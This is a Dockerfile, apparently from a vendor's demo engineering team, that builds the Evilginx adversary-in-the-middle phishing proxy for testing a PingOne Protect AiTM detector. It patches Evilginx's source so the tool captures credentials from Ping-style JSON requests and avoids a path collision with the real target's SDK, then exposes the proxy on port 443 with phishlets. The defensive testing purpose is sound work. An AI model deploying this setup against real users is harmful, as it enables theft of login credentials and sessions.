FROM golang:alpine

LABEL com.pingidentity.author="DemoOps Engineering"
LABEL com.pingidentity.organization="Technical Enablement"
LABEL description="A Docker image implementation of Evilginx configured only for testing PingOne Protect AiTM predictor or demo purposes."

ARG BUILD_RFC3339="1970-01-01T00:00:00Z"
ARG COMMIT="local"
ARG VERSION="v3.3.0"

ENV GITHUB_USER="kgretzky"
ENV EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/evilginx2"
ENV INSTALL_PACKAGES="git make gcc musl-dev go"
ENV PROJECT_DIR="${GOPATH}/src/${EVILGINX_REPOSITORY}"
ENV EVILGINX_BIN="/bin/evilginx"

RUN mkdir -p ${GOPATH}/src/github.com/${GITHUB_USER} \
    && apk add --no-cache ${INSTALL_PACKAGES} \
    && git -C ${GOPATH}/src/github.com/${GITHUB_USER} clone https://github.com/${GITHUB_USER}/evilginx2 

# The sed command in the RUN section below fixes a regex in the evilginx src that does not properly match when there are periods in
# the Content-Type header for requests. It tries to match on just words, but PF uses (e.g. 'application/vnd.pingidentity.submitIdentifier+json')
# so it wasn't looking for credentials in the calls it needs to prior to this alteration.
#
# The sed commands below rename evilginx's own reserved "/s/<id>" path (used internally for its
# session-redirect / js_inject mechanism, core/http_proxy.go + core/scripts.go) to
# "/__eg3k9f__/<id>". PingAM/Advanced Identity Cloud's own Signals SDK bootstrap asset happens to
# live at exactly "/s/<hash>[.js]" on the real target - a genuine path-namespace collision where
# evilginx intercepts those requests for itself (treating the SDK's asset hash as if it were an
# evilginx session ID) instead of proxying them to the real backend, so the SDK's own init request
# hangs until timeout and never completes. Confirmed by reading this exact source (v3.3.0) and by
# a reproducible test: fetching that same path hung 30s through evilginx with zero response, vs an
# instant clean response hitting the real backend directly. Renaming evilginx's reserved prefix to
# something no real site is realistically going to use removes the collision.

RUN set -ex \
        && cd ${PROJECT_DIR}/ && git checkout tags/${VERSION} \
        && sed -i 's|application\\\\/\\\\w\*\\\\+?json|application\\\\/.*\\\\+?json|' ./core/http_proxy.go \
        && sed -i 's|regexp.MustCompile("\^\\\\/s\\\\/(\[\^\\\\/\]\*)")|regexp.MustCompile("^\\\\/__eg3k9f__\\\\/([^\\\\/]*)")|' ./core/http_proxy.go \
        && sed -i 's|regexp.MustCompile("\^\\\\/s\\\\/(\[\^\\\\/\]\*)\\\\/(\[\^\\\\/\]\*)")|regexp.MustCompile("^\\\\/__eg3k9f__\\\\/([^\\\\/]*)\\\\/([^\\\\/]*)")|' ./core/http_proxy.go \
        && sed -i 's|fmt.Sprintf("/s/%s/%s.js", s.Id, js_id)|fmt.Sprintf("/__eg3k9f__/%s/%s.js", s.Id, js_id)|' ./core/http_proxy.go \
        && sed -i 's|fmt.Sprintf("/s/%s.js", s.Id)|fmt.Sprintf("/__eg3k9f__/%s.js", s.Id)|' ./core/http_proxy.go \
        && sed -i 's|var url = "/s/" + sid;|var url = "/__eg3k9f__/" + sid;|' ./core/scripts.go \
        && go get ./... && make \
		&& cp ${PROJECT_DIR}/build/evilginx ${EVILGINX_BIN} \
		&& apk del ${INSTALL_PACKAGES} && rm -rf /var/cache/apk/* \
        && rm -rf ${GOPATH}/src/*

COPY ./phishlets /phishlets
COPY ./config /config
COPY ./docker-entrypoint.sh /opt/

RUN chmod +x /opt/docker-entrypoint.sh
EXPOSE 443

ENTRYPOINT ["/opt/docker-entrypoint.sh"]


STOPSIGNAL SIGKILL
